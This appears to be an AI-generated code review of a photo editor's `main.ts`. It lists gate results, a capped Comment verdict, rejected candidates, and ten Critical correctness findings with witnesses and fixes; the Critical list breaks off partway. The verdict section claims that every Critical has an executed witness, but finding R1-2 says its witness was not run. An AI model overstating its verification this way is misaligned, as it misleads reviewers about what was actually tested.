# Code review — `src/main.ts` (whole-file)

- **Timestamp:** 2026-09-27 18:20:09 (local)
- **Target:** `src/main.ts` — file review, 6,625 lines / 311,535 bytes
- **Effort:** medium (balanced) — findings **were verified** in Step 4; **no reverse audit** (Step 5 is high-effort only), so the verdict is capped at Comment
- **Posting:** none (a file target has no pull request to post to)

## Provenance

| | |
|---|---|
| Head SHA reviewed | `bbb9b8d857f9147fc20092b0203f2942668d59cc` — "refactor: extract the print module out of main.ts" |
| Base | **none — there is no diff.** `src/main.ts` is tracked and unmodified (`git status --porcelain` empty), so `capture-local` produced 0 chunks and this ran as a whole-file review of the committed state |
| Platform | local working tree, macOS (darwin) |
| Node / npm | v26.8.1 / 11.19.0 |

### Gates

| Gate | Result |
|---|---|
| `build` (`tsc && vite build`) | **ran — clean.** exit 0 in 1.096s; tsc zero diagnostics under `strict`, `noUnusedLocals`, `noUnusedParameters`, `noFallthroughCasesInSwitch`; vite built 87 modules. One non-fatal warning, not in the reviewed file: `node:module` externalized for browser compatibility, imported by `src/wasm/libraw.js` |
| `test` (`vitest run`) | **ran — clean.** exit 0, 47 files, **790 passed, 0 failed, 0 skipped** in 908ms. The known-flaky `src/app/filters.test.ts` perf assertion did not fire on this run |
| `script-lint` | **ran — nothing to lint.** No executable scripts changed (there is no diff) |
| `test-efficacy` | **skipped** — no test failure to attribute, so no base-tree delta was measured |
| `test-plan` | **skipped** — PR-only gate; this is a file review |

**Diff statistics:** omitted — a file review with no diff.

## Build & test summary (Agent 7)

No install was needed (`node_modules` already present: typescript 6.0.2, vite 8.2.0, vitest 4.1.11, @tanstack/virtual-core). `src/main.ts` is inside the tsc program (`tsconfig.json` `include: ["src"]`, no `exclude`) and is the real bundle entry (`index.html:2863`), so it was both typechecked and bundled. **No `src/main.test.ts` exists** — `main.ts` is covered by the typechecker and the bundler only; its logic-bearing neighbours in `src/app/` (10 test files), `src/catalog/` (17), `src/gpu/` (16) and `src/raw/` (4) are all tested. Because test files live under `src/`, the build's tsc pass typechecks them too. Working tree confirmed clean after the run; no source file was modified.

## Verdict

Verdict: Comment — a Request changes was NOT available: its blockers were never verified (they are posted, disclosed as unverified)

The composed event is `COMMENT`, capped from a base event of `REQUEST_CHANGES` by: `unreviewed-dimension`, `criticals-unverified`.

**Why it was capped, stated plainly rather than narrated away.** Both caps are a consequence of the *path* this review had to take, not of work that was skipped:

1. `unreviewed-dimension` — `compose-review` certifies coverage from the harness transcripts intersected with the diff ranges recorded in the plan. This plan has **no `chunks[]`** because the file has no diff, so there is no recorded range for the gate to intersect. The file was in fact read in full: seven territory agents covered lines 1–6,625 in contiguous paged ranges, each returning a receipt naming what it walked, plus three whole-file lenses (cross-module tracer, test coverage, build & test).
2. `criticals-unverified` — the same transcript intersection proves Step 4 ran by matching a prompt recorded by `agent-prompt --role verify`. That builder requires a plan with chunks, so on this no-diff path the three verifier agents were briefed by hand and left no recorded prompt for the gate to match. Verification did run: three dedicated verifier agents ruled on all 20 Critical candidates and executed real witnesses — five `vitest`/`node -e` probes, and deterministic sweeps (`grep -rn 'gpuExclusive' src/` → 1 hit, a comment; `grep -n 'innerHTML|…' src/main.ts` → 2 assignments of 5 matches; `grep -n 'Pipeline.create'` vs `grep -n '.destroy()'`; `grep -n "addEventListener('keydown'"` → 8 sites tabulated).

No repair was available: `remediation` is empty, because the builder that would construct the recorded prompts needs the same chunk-less plan. Per the skill's rule the cap stands and is disclosed rather than argued away. **The 20 Criticals below are verified findings with executed witnesses; only the machine-certification of that fact is missing.**

Nothing was posted anywhere — this is a local file review.

## Findings

Artifact counts: {"total":42,"bySeverity":{"Critical":20,"Suggestion":16,"Nice to have":6},"byConfidence":{"high":35,"low":7},"held":0}. Read from `.qwen/tmp/qwen-review-src_main.ts-findings.json` (canonicalized by `qwen review findings`), not re-typed from the terminal.

Four candidates were **rejected** by verification with direct counter-evidence, and are not listed below:

- `opsToLabel` indexing `FILM_STOCKS`/`BW_TONES` with an unvalidated persisted id — `isValidOp` validates both (`editsStore.ts:59-62` via `isFilmStockId`, whose set is derived from `Object.keys(FILM_STOCKS)` and therefore cannot drift; `editsStore.ts:96-102` for the five BW tones), and all routes into `opsToLabel` pass it, including `parsePreset`. Residual: the BW list is maintained independently of `bw.ts` — Nice to have.
- Batch export skipping the display-orientation correction — orientation is applied inside `Pipeline.load`'s normalize pass (`pipeline.ts:293`), not by `main.ts`, and `exportImage` reads the already-flipped texture (`pipeline.ts:271-278` documents this).
- GPU device-loss recovery dropping the dodge mask, and `currentEditState!` throwing — `pipeline.load()` is unreachable on that path (it aborts at `main.ts:3291`), and `currentFileId`/`currentEditState` are assigned adjacently at `3148-3149` with no intervening await and never nulled. Both are subsumed by R1-13.
- Sync Settings not copying a control the source cleared to neutral — this is the **documented, tested, deliberate** contract of commit `a6cba69` ("copies intent, not state"): `syncOps.ts:4-6` and `:52-54` state it, `index.html:2762`/`2773` tell the user, and six `syncOps.test.ts` cases pin it. The claimed "✓ synced" contradiction is also refuted — the message counts **photos**, not controls (`main.ts:5918`).

Also **rejected**: the routed claim that `main.ts:4813` calls `getContext('2d')!` on `#canvas` (which `pipeline.ts:222` holds as `'webgpu'`). The `canvas` at 4813 is the block-local `document.createElement('canvas')` declared at 4810 inside `exportContactSheet`, a fresh element that never had a webgpu context — so the `!` is sound. The shadowing of the module-level `canvas` by two locals (4810, 4898) is a readability hazard worth a rename, nothing more.

### Critical (20)

#### R1-1 — `src/catalog/editsStore.ts:113`

**isValidOp rejects light-leak patterns 2 and 3, so picking…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `(l.pattern === undefined || (typeof l.pattern === 'number' && l.pattern >= -1 && l.pattern <= 1));`

**What's wrong.** The light-leak pattern vocabulary is five values (-1 Auto, 0..3 Set A..D): index.html offers all five, main.ts:779 reads them, and src/gpu/lightleak.ts:43 clamps to 0..3. But isValidOp accepts only -1..1. The write path never validates, so a pattern:2 row IS persisted; on load isValidEditRow uses history.every(snapshot => snapshot.every(isValidOp)), so one rejected op falsifies the WHOLE row and loadEditState falls back to createEditState() - an empty state. listEditedFileIds skips the row too, so the photo also drops out of the Edited filter. Surfaced by reviewing src/main.ts; the fix lands in editsStore.ts.

**Failure scenario.** Open a photo, set Light leak amount 40 with Pattern 'Set C - punchy', commit. Reload the page. isValidEditRow returns false, loadEditState returns createEditState(), and the photo opens with zero edits: every exposure, WB, tone, crop and dodge/burn edit on that photo is gone, with no warning and no console output. The photo also stops appearing in the Edited filter column, so it reads as never-edited.

**Witness.** npx vitest run .qwen/tmp/c1probe.test.ts -> isValidOp({kind:'lightleak',...,pattern:-1}) => true; pattern:0 => true; pattern:1 => true; pattern:2 => false; pattern:3 => false; isValidEditRow(row with exposure+WB+tone+crop+dodge+lightleak Set C) => false (2 tests passed)

**Suggested fix.** Widen the bound to the GPU's real range: `l.pattern >= -1 && l.pattern <= 3`. Better, export a single LIGHTLEAK_PATTERN_NAMES/LIGHTLEAK_PATTERN_COUNT from src/gpu/lightleak.ts and derive both isValidOp's bound and packLightleak's clamp from it so the validator and the packer cannot drift again. Add an editsStore.test.ts case pinning pattern 2 and 3 round-tripping.

**Fix witness (acceptance criterion).** A new editsStore.test.ts case asserting isValidOp({kind:'lightleak',amount:40,hue:0,fade:0,pattern:2}) === true and isValidEditRow(a row containing it) === true must go red if the widened bound is reverted.

**Fix constraint.** The bound must stay within the range src/gpu/lightleak.ts:43 already clamps to - `Math.min(Math.max(Math.round(p.pattern), 0), 3)` with -1 meaning auto - so widening to 3 cannot admit a value the shader packer would reject.

---

#### R1-7 — `src/main.ts:730`

**clampCurveX cannot separate a dragged point from the…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `best = Math.min(1, Math.max(0, other + (best >= other ? 0.02 : -0.02)));`

**What's wrong.** With other === 1, best has already been clamped to <= 1, so best >= other forces best === 1 and the nudge computes 1 + 0.02 = 1.02, which Math.min(1, ...) returns as exactly 1. The nudge can only push outward at the right edge and the clamp pushes it back; the left edge is genuinely asymmetric (0 - 0.02 with best >= other gives +0.02, pushing inward into representable space). buildToneCurveLut (tone.ts:343-357) sorts then dedupes by EXACT x equality keeping the last y. A second path bypasses clampCurveX entirely: the pointerdown handler at 3697-3706 pushes the raw event coordinate with no clamp when nothing is nearby, and clicking the right edge at mid-height is farther than nearestCurvePoint's ~0.06 threshold from the pinned (1,1), so a duplicate x=1 lands on the very first click.

**Failure scenario.** Point mode, default curve [0,0,1,1]. Click empty space near the right edge at mid-height - or drag a point past the canvas edge, which curvePointFromEvent clamps to exactly 1. curvePoints becomes [0,0, 1,1, 1,0.5]. The LUT collapses to a straight line from (0,0) to (1,0.5): the white endpoint jumps off (1,1), the entire highlight end of the render changes, and one control point is gone. drawCurve still paints both points as live, and the collided point can never be dragged apart again because clampCurveX cannot separate it.

**Witness.** npx vitest run .qwen/tmp/c1920probe.test.ts -> buildToneCurveLut([0,0,1,1,1,0.5])[511] (y at x=1) = 0.5; ([0,0,1,0.5,1,1])[511] = 1; 'white endpoint y=1 survives in A? false'; clampCurveX mirror: drag to far RIGHT x=1 -> 1 COLLISION=true; drag near right x=0.995 -> 0.98 COLLISION=false; drag to far LEFT x=0 -> 0.02 COLLISION=false; drag near left x=0.005 -> 0.02 COLLISION=false

**Suggested fix.** Pick the side that is actually on-canvas instead of clamping the preferred side: `const up = other + MIN_GAP, down = other - MIN_GAP; best = best >= other ? (up <= 1 ? up : down) : (down >= 0 ? down : up);`. Also route the pointerdown push at 3697-3706 through clampCurveX so the no-drag path cannot create a duplicate either.

**Fix witness (acceptance criterion).** A tone.test.ts case asserting buildToneCurveLut never receives two identical x values from the editor path, or a unit test on an extracted clampCurveX asserting clampCurveX(1, <index of the x=1 point>) !== 1. Must go red if the outward-nudge-then-clamp form is restored.

**Fix constraint.** The function's own comment at src/main.ts:722-724 states the invariant it must hold - 'nudg[ing] it clear of any other point's x so a drag can't stack duplicates (buildToneCurveLut would silently drop one)' - so the fix must keep both edges clear, not only the right one.

---

#### R1-8 — `src/main.ts:976`

**syncDodgeMaskToGPU never reconciles the CPU mask's dims…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `pipeline.setDodgeMask(maskToBytes(effectiveMask(paintMask, paintMaskW, paintMaskH, p.opacity, p.feather)));`

**What's wrong.** The texture is allocated independently in Pipeline.load from maskDims(outW, outH) of the LOADED image (pipeline.ts:337-343), while the upload size comes from paintMaskW/H, which applyOpsToSliders:1183-1191 sets from the OP's stored dims. Pipeline.setDodgeMask guards only `bytes.length !== w * h` and returns void silently on both rejection paths, and syncDodgeMaskToGPU sets dodgeMaskDirty = false on the next statement unconditionally - so a dropped upload is never retried and the caller cannot learn it happened. The length-only guard is insufficient: maskDims is a pure per-axis scale capped at DODGE_MASK_MAX=1024, so transposed dims have an identical product.

**Failure scenario.** Sync Settings from a portrait reference onto a landscape loupe photo (main.ts:5926-5934 applies the merged op set, and syncableOps passes dodgeBurn through because 'presence already means intent'): mergeKinds replaces the target's dodgeBurn op verbatim, carrying the reference's maskW/maskH. maskDims(6000,4000)=[1024,683] and maskDims(4000,6000)=[683,1024] - both product 699392 - so the guard passes and 699,392 row-major bytes are written into a transposed texture. The brush strokes appear scrambled over the image and the wrong pixels are baked into the export. With a non-coinciding product (3:2 -> 4:3) setDodgeMask returns early, the dirty flag clears anyway, and the stroke renders as nothing with no error and no retry.

**Witness.** node -e replicating maskDims from src/gpu/dodge.ts:32-35 -> landscape 6000x4000 => 1024x683 product 699392; portrait 4000x6000 => 683x1024 product 699392; landscape 8000x5333 => 1024x683 product 699392; landscape 5000x3000 => 1024x614 product 628736. Guard is bytes.length !== w*h: equal-product transpose => guard does NOT fire (scrambled write); 699392 vs 628736 => guard fires (silent drop) and dodgeMaskDirty is cleared anyway.

**Suggested fix.** Verify dims before uploading and leave the flag set on rejection: compare paintMaskW/H against maskDims(canvas.width, canvas.height) and resample (or reallocate-and-drop) on mismatch. Make Pipeline.setDodgeMask return boolean and only clear dodgeMaskDirty on true - its `if (!this.dodgeMaskTexture) return;` early-out has the same flag-swallowing effect.

**Fix witness (acceptance criterion).** A pipeline or dodge test asserting setDodgeMask rejects a byte array whose dims are transposed relative to the texture (equal product, different shape), and a main.ts-level test asserting dodgeMaskDirty stays true after a rejected upload. Must go red if the guard reverts to length-only.

**Fix constraint.** The guard must stay a length/shape check on the GPU side - src/gpu/pipeline.ts:713-717 returns void with no error channel, so any rejection signalling has to be added as a return value rather than a throw, to avoid breaking the three existing call sites.

---

#### R1-6 — `src/main.ts:1047`

**A point-curve edit made between the four region anchors…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `if (!isNeutralRegion(region)) ops.push({ kind: 'toneCurve', mode: 'region', ...region });`

**What's wrong.** fitRegionParams (src/gpu/tone.ts:447-461) recovers the sliders by sampling the LUT at exactly x = 0.88/0.60/0.40/0.12 - the same four x-values parametricControlPoints emits as control points. PCHIP interpolates its control points exactly, so a bump inserted strictly between anchors leaves all four samples unchanged and the fit returns {0,0,0,0}. syncPointsToRegion writes those zeros into the sliders, isNeutralRegion then returns true, and the region branch of currentOpsFromSliders pushes no op. The anchor-aligned start state is the DEFAULT, not a corner case: applyOpsToSliders:1219-1224 sets curvePoints = parametricControlPoints(...) for any stored region op, and every region slider 'input' calls syncRegionToPoints. tone.ts:410-414 documents the invertibility contract this falsifies.

**Failure scenario.** Touch Region once (or open a photo that already has a region op) so the curve is anchor-aligned, switch Adjust to Point, click empty space at x~0.74 and drag up - a visible highlight bend. Switch Adjust back to Region: syncPointsToRegion fits {0,0,0,0}, the four sliders read 0, drawCurve snaps the curve flat, currentOpsFromSliders pushes no toneCurve op, and commitCurrentEdit persists the loss as a new history row. The user's edit is gone from a dropdown the code comments describe as 'a view switch, not an edit'.

**Witness.** npx vitest run .qwen/tmp/c1920probe.test.ts against the real fitRegionParams/buildToneCurveLut/parametricControlPoints -> anchors-only curve => {highlights:0,lights:0,darks:0,shadows:0}; SAME curve +bump at x=0.25 y=0.45 => {0,0,0,0} with 'LUT differs from linear? true'; control [0,0,0.20,0.30,1,1] => {15,61,84,59} (proving the fit is not merely always-zero); parametricControlPoints(0,50,0,0) => {0,50,0,0}

**Suggested fix.** Keep the point curve authoritative when the region handle reads neutral but the shared curve is not linear: in the region branch add `else if (!isLinearCurve()) ops.push({ kind: 'toneCurve', mode: 'point', points: [...curvePoints] })`, and mirror the same fallback in activeCurve() so the drawn curve matches the render. Note the defect is broader than total loss: a bare between-anchor curve with no anchor control points fits to unrelated large values ({15,61,84,59}), silently rewriting the four sliders - so the fit needs a guard, not only a fallback.

**Fix witness (acceptance criterion).** A tone.test.ts case asserting that a LUT carrying a bump strictly between the four anchors does NOT fit to all-zero region params (or that main.ts still emits a toneCurve op for it). Must go red if the neutrality fallback is removed.

**Fix constraint.** src/gpu/tone.ts:410-414 documents the intended contract - anchors at fixed x make the map invertible so 'the Region sliders and the Point curve stay the SAME underlying value' - while :443-446 hedges only that a free-curve fit is 'best-effort ... approximate'. The fix must restore exact invertibility for anchor-aligned curves; approximation is licensed, total loss is not.

---

#### R1-13 — `src/main.ts:1478`

**GPU device-loss recovery is a guaranteed no-op that…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `await loadIntoPipeline(file, Date.now());`

**What's wrong.** Two independent routes both fail, and each closes the other. (a) loadedFileId is written only at 3311/3367/3399, all inside loadIntoPipeline, and the recovery path never clears it; with loadedFileId === currentFileId (the normal state on a device loss) line 3279 `if (loadedFileId === record.id) return true;` returns immediately. The recreated pipeline has no image - the constructor does not build demosaicedTexture/opA/opB, load() does - so pipeline.render hits pipeline.ts:627 `if (!this.demosaicedTexture || !this.opA || !this.opB) return;` and blits nothing. The handler ignores the return value entirely (contrast openFile:3161, which checks it). (b) Even past the memo, the request id is Date.now() (~1.77e12) while every staleness check compares against openRequestId, declared 0 at :1536 and incremented once per open at :3093 - so 3291 `if (requestId !== openRequestId) return false;` fires unconditionally before any GPU work. Reaching equality would take ~1.77e12 openFile calls.

**Failure scenario.** The user is in Develop on a photo, the GPU device is lost (driver reset, tab discarded under memory pressure, adapter switch). The handler recreates the pipeline, loadIntoPipeline returns true (or false) without uploading anything, renderOps blits nothing, and the loupe is black. Three seconds later the user is told 'Recovered from GPU device loss.' Pressing Export then either throws 'No image loaded to export.' or reports 'Nothing to export yet - open the photo in Develop first', with no path back except selecting another photo and returning.

**Witness.** grep sweeps -> openRequestId in main.ts: 1536 (let openRequestId = 0), 3093 (const requestId = ++openRequestId), and every staleness check at 3129 3146 3242 3291 3309 3322 3389 is `requestId !== openRequestId`; 3438 passes openRequestId. loadedFileId writes: 3311, 3367, 3399 - ALL inside loadIntoPipeline; memo guards at 3279 and 3434. The recovery handler at 1474-1500 clears neither.

**Suggested fix.** In the recovery handler: set loadedFileId = null before reloading (the new pipeline holds no textures), pass openRequestId rather than Date.now(), check the boolean result before rendering, and guard currentEditState. Wrap in the same `const ok = await loadIntoPipeline(...); if (ok) {...}` shape openFile uses.

**Fix witness (acceptance criterion).** A test on an extracted recoverPipeline(create, hooks) taking an injectable create, asserting the reload is actually issued (loadedFileId invalidated, a monotonic request id used) and that a failed load reports failure rather than success. Must go red if the Date.now() id or the missing invalidation is restored.

**Fix constraint.** The handler closes over `let` bindings declared at main.ts:1501-1502, after its own registration at :1474 - only synchronous statements separate them so there is no TDZ window today, but any fix that introduces an await before first use must keep that ordering intact.

---

#### R1-14 — `src/main.ts:1495`

**The device-loss recovery auto-dismiss remove()s the #error…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: fails-closed
- Anchor: `if (errorEl) errorEl.remove();`

**What's wrong.** showError (374-378) writes only into three module-level bindings captured once at load (242-244): errorEl, errorMessageEl, errorDetailEl - and #error-message/#error-detail are CHILDREN of #error (index.html:2748-2754), so all three references die together when the parent is removed. The recovery's dismissal at 1493-1497 is a setTimeout that queries #error and calls .remove() on it, shadowing the module binding with a local. clearError (390-394) establishes that hidden = true is the codebase's dismissal idiom, and the Escape handler at 400 uses it. No code path recreates the node.

**Failure scenario.** A GPU device loss occurs and recovers; 3 seconds later #error is deleted from the document. The user then clicks a photo whose permission was revoked - showError('Permission needed to read "IMG_1234.CR3" - click it again to retry.') at 3105 renders nothing at all. Same for 'Export failed.' (3929), "Couldn't save the photo metadata." (6480), "Couldn't import dropped folder." (6572) and every one of the 51 showError references. The app's only error channel is silently dead for the rest of the session - including the channel that would have reported R1-1, R1-9 and R1-10.

**Witness.** grep -n 'errorEl' src/main.ts -> 242 (const errorEl = document.querySelector<HTMLDivElement>('#error')!), 377 (errorEl.hidden = false), 392 (errorEl.hidden = true), 400 (Escape handler), 1495 (a shadowing local query), 1496 (errorEl.remove()). A sweep for createElement('div') / '#error' finds 242, 243, 244 and 1495 - nothing recreates the node. Of 51 showError( references, all write into the detached subtree after recovery.

**Suggested fix.** Use the established dismissal idiom instead of deleting the node: `setTimeout(() => { if (errorMessageEl.textContent === 'Recovered from GPU device loss.') clearError(); }, 3000);` - the text check also keeps a newer error from being dismissed by this stale timer.

**Fix witness (acceptance criterion).** A jsdom/QA check that triggers the recovery dismissal, then calls showError and asserts #error is still in the document and visible with the new message. Must go red if remove() is restored.

**Fix constraint.** clearError at src/main.ts:390-394 sets hidden = true and blanks both child elements - that is the dismissal contract the Escape handler at :400 also relies on, so the fix must reuse it rather than introduce a second dismissal path.

---

#### R1-4 — `src/main.ts:1699`

**decodeFilterValue re-guesses a filter value's type from…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `return /^\d+$/.test(encoded) ? Number(encoded) : encoded;`

**What's wrong.** encodeFilterValue does String(v), so the string '2024' and the number 2024 both encode to '2024' and the round trip cannot recover which it was. decodeFilterValue then applies /^\d+$/ -> Number() to EVERY column, and returns the NONE sentinel for the literal 'none'. A number reaching applyFilters goes down filters.ts numberMatches, whose default: case returns false for keywords. The chip still shows active because paintFilterState re-encodes the stored number to the same dataset.val string, and describeFilters names the filter in the summary bar. Numeric keywords are realistic, not hypothetical: filterColumnValues derives keyword chips from live file data, and normalizeKeyword strips only ,;| and whitespace - digits are untouched. The module's own doc comment uses ' wedding 2024 ' as its worked example.

**Failure scenario.** The user keywords 300 photos '2024'. The chip '2024' appears in the Keywords group. Clicking it decodes to the number 2024, numberMatches' default branch returns false for keywords, and the grid empties to zero photos - while the chip lights up, gets aria-pressed='true', and the summary bar describes an active filter. A keyword literally named 'none' instead filters 'photos with no keywords'.

**Witness.** npx vitest run .qwen/tmp/c12probe.test.ts -> encode('2024')='2024'; decode(...) = 2024 typeof number; real applyFilters with keywords:['2024'] (string) => 1 of 1; keywords:[2024] (number) => 0 of 1; decode('none') = {kind:'none'} => 0 of 1; statePair 'keywords|2024' === chipPair 'keywords|2024' => active = true (3 tests passed)

**Suggested fix.** Make the codec column-aware and move it beside the vocabulary it encodes: export encode/decodeFilterValue from src/app/filters.ts, pass the column, and only apply the numeric branch to the genuinely numeric columns (rating, iso, date, focal). Restrict the 'none' sentinel to columns that can be NONE. Alternatively make the encoding type-carrying (a prefix) so it round-trips losslessly.

**Fix witness (acceptance criterion).** A filters.test.ts round-trip case over the whole vocabulary asserting decode(encode('2024')) is the STRING '2024' for the keywords column and that decode(encode('none')) is not the sentinel for a string-valued column. Must go red if the column parameter is dropped.

**Fix constraint.** src/app/filters.test.ts already pins that toggleFilterValue 'matches range/none values structurally, not by identity' - the fix must preserve structural (not reference) equality for NONE and range values or those existing tests break.

---

#### R1-17 — `src/main.ts:1968` (+2 more sites: src/main.ts:2930, src/main.ts:2802)

**Search is hand-rolled inline instead of routed through the…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `} else if (searchQuery) {`

**What's wrong.** Three confirmed symptoms of one root. (a) The inline predicate matches only path, cameraModel and lensModel, while filters.ts:264-273 textMatches scope 'any' also matches keywords - and FilterState.text is never populated anywhere in main.ts (all four filterState assignments carry only columns), so applyFilters' text path is dead code and this inline filter is the app's only search. (b) The search input handler DOES null the collection ids, so the originally-claimed 'search is inert in a collection view' is wrong; the real defect is the opposite direction - appendFolderRow's click handler (2930-2939) resets activeCollectionId, activeSmartCollectionId and previousImportFilter but NOT searchQuery, and the searchQuery arm sits ABOVE those arms, so a stale query silently overrides every folder and Previous-Import click. That is verbatim the bug the handler's own comment says the reset exists to prevent. (c) The .active class is painted in exactly two places (renderCollections 2802-2805, renderSmartCollections 2881) and neither is called by the search handler or by rebuildGrid, so the sidebar keeps the highlighted row and its count badge while the grid has re-scoped catalog-wide. rebuildGrid's own header comment (1917-1920) says it honors 'folderFilter, cullFilter, activeCollection, activeSmartCollection, AND searchQuery' - the author's model is conjunctive; the code is mutually exclusive.

**Failure scenario.** (a) The user keywords 300 photos 'sunset' from the Keyword List, then types 'sunset' into Search: zero results, with the empty-state copy reading 'No photos match this view. Clear the search or filters...' and no hint that keywords are simply not searched. (b) The user searches 'dsc', then clicks the '2024-06 Wedding' folder row - the grid does not change at all and the click appears to do nothing. (c) The user clicks collection 'Wedding' (sidebar highlights it, badge reads 200), types 'dsc', and the grid now shows every 'dsc' in the 40k catalog while 'Wedding' stays highlighted with its 200 badge - the footer's 'N of M photos' is computed over a scope no visible UI element names.

**Witness.** grep -n 'filterState' src/main.ts -> 1564 (let filterState: FilterState = { columns: {} }), 1837 (toggleFilterValue), 1882 ({ columns: {} }), 1894 ({ columns }), 1949/1953 (read), 5122 (isFilterActive). NO assignment anywhere carries `text`, so filters.ts:117 `state.text && state.text.query.trim() !== ''` is unreachable and textMatches is dead from the app. grep for '.active' painters -> 2802-2805 and 2881 only; the 11 renderCollections() call sites (2772, 2825, 2858, 5337, 5380, 5504, 6085, 6100, 6125, 6566, 6597) do not include the search handler.

**Suggested fix.** Delete the inline filter and route search through the tested engine as an AND term applied before the branch chain: `filesToShow = applyFilters(filesToShow, { columns: filterState.columns, text: { query: searchQuery, scope: 'any' } })`, leaving the chain to select only the SCOPE (collection / smart collection / previous import / folder). That fixes (a) and (b) at once and makes isFilterActive/describeFilters able to report the search. For (c), repaint the source list when the scope changes, or drop the reset entirely once search ANDs. Also remove the `(f as any)` casts.

**Fix witness (acceptance criterion).** A QA check that keywords a seeded photo 'sunset', types 'sunset' into #search-input, and asserts the grid shows it; plus a check that searches, then clicks a folder row, and asserts the grid follows the folder. Must go red if search is moved back into the else-if chain.

**Fix constraint.** src/app/filters.test.ts pins applyFilters' composition - text ANDs with columns (filters.ts:117) - and the openTargetCollection comment at main.ts:5350-5360 ('a stale search term over it would show an empty grid') shows the author already believed search ANDs with a collection view, so the conjunctive fix matches the documented intent rather than changing it.

---

#### R1-2 — `src/main.ts:2075`

**orderedVisibleIds ignores 7 of the 9 scope terms…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `let ids = allFiles.filter((f) => folderFilter === null || f.folderId === folderFilter).map((f) => f.id);`

**What's wrong.** rebuildGrid narrows by nine terms (keywordFilter, filterState, activeCollectionId, activeSmartCollectionId, searchQuery, previousImportFilter, folderFilter, matchesCullFilter, stackVisibleFiles). orderedVisibleIds narrows by two (folderFilter, previousImportFilter). Opening a collection nulls folderFilter and reloadCatalog re-reads every folder, so allFiles is the whole catalog and the shift-click slice spans every catalog id between the two clicks. Nothing prunes it afterwards: pruneSelectionToVisible has exactly one caller (repaintGrid), and the selection subscriber only paints outlines in place. Separately pruneSelectionToVisible early-returns on !visibleFiles.length, so a filter that empties the grid leaves the entire prior selection live. handleRemoveOrDelete passes selectionTargets() straight to the dialog, whose only defence is a count plus one sample name drawn from ids[0] - itself one of the unseen files.

**Failure scenario.** Open collection 'Wedding' (200 of 40k photos), ctrl+click photo A, scroll, shift+click photo B. ids.indexOf resolves against the whole catalog, so setSelection receives every id between them - thousands, almost all outside the collection and not rendered. The footer reads '4712 selected'. Press 5 and thousands of unseen photos are rated and persisted. Press Delete, switch the dialog to 'Delete from disk instead...' and confirm, and those same unseen files go to the system trash - while the dialog's sample filename named a photo the user never selected.

**Witness.** not run - the deciding facts are three function bodies plus a caller census, all quoted; the closest capability was a vitest scratch around orderedVisibleIds, but it closes over module-level allFiles/folderFilter inside main.ts, which executes document.querySelector(...)! at import time and cannot load under vitest's node environment

**Suggested fix.** Range over the grid's own reading order, which already exists: in library mode return visibleFiles.map(f => f.id) (built by collectVisibleFiles from gridEntries, i.e. post-collection/search/cull/stacks). Independently, drop `|| !visibleFiles.length` from pruneSelectionToVisible's guard so an emptied view prunes like every other. And bound the destructive verb: in handleRemoveOrDelete, intersect selectionTargets() with the visible set and refuse (or warn with the off-screen count) when they differ.

**Fix witness (acceptance criterion).** A QA-harness or jsdom check that collapses a stack (or opens a collection), dispatches shift+click on two visible cells, and asserts document.querySelectorAll('.catalog-cell.selected').length equals the visible span - not the catalog span. Must go red if orderedVisibleIds reverts to filtering allFiles.

**Fix constraint.** visibleFiles' own doc comment at src/main.ts:2213-2216 already claims it is the 'One owner for "what's visible": ... shift-click ranges over it' - the fix must make the implementation match that stated invariant rather than introducing a second source of truth.

---

#### R1-10 — `src/main.ts:2416`

**The gpuExclusive mutex the code's own comment promises…**

- Severity: **Critical** · Confidence: high · Source: `[review]` · Category: correctness · Direction: certifies-falsely
- Anchor: `if (fileId === loadedFileId && digest === loupeRenderDigest) {`

**What's wrong.** main.ts:2341-2342 comments 'gpuExclusive is set while a batch export / compare render is using the same offscreen textures -- interleaving would trash a half-used image'. The identifier appears exactly once in the entire repo: in that comment. Pipeline.exportImage mutates shared instance state (pipeline.ts:861-862 this.displayTexture = source; writeBuffer(this.cropBlitUniform, ...)) and dispatchOps ping-pongs instance textures while writing shared opUniformBuffers. The drain's staleness guard is evaluated BEFORE its await, so it cannot detect a load landing mid-await. The batch disables only batchExportBtn and exportButton; the grid, filmstrip, keyboard nav and openFile all stay live, and inflightDecode is never set or consulted by the batch. The trigger is not exotic: because the batch never updates loadedFileId (R1-9) while renderOps sets loupeRenderDigest for the CURRENT photo's ops, the guard evaluates true and routes the current file's thumbnail through a pipeline holding another photo.

**Failure scenario.** In Develop with the filmstrip visible, start a 50-file batch export. The drain reaches the loupe file, passes the guard, awaits IDB; the batch's pipeline.load(nextFile) swaps the textures; exportImage renders nextFile's image with the loupe's ops; saveEditedThumbnail writes it under the loupe file's id AND its digest. The grid, strip and contact sheet then show a different photo for that file permanently - needsEditedThumbnail compares digests, sees a match, and certifies the poison as fresh, so it never self-heals.

**Witness.** grep -rn 'gpuExclusive' src/ -> src/main.ts:2341 (a comment). grep -rn 'gpuExclusive' --exclude-dir=node_modules --exclude-dir=.git . -> ./src/main.ts:2341 (same). Exact hit count: 1. No declaration, no read, no write anywhere in the repo.

**Suggested fix.** Implement the mutex the comment names and use it on both sides: a module-level gpuExclusive promise chain with a withMainPipeline(fn) helper wrapping the drain's exportImage and the batch's load+exportImage pair. Also re-check fileId === loadedFileId && digest === loupeRenderDigest AFTER the await, before saveEditedThumbnail. Or drop the fast path and always use offscreen.renderThumbnail, which is already serialized inside OffscreenRenderer.

**Fix witness (acceptance criterion).** A test asserting that a thumbnail render started while a batch export holds the pipeline mutex does not dispatch concurrently (e.g. by instrumenting exportImage call order), or a QA check that batch-exports while the filmstrip is visible and asserts every stored thumbnail's pixels match its own file id. Must go red if the mutex is removed.

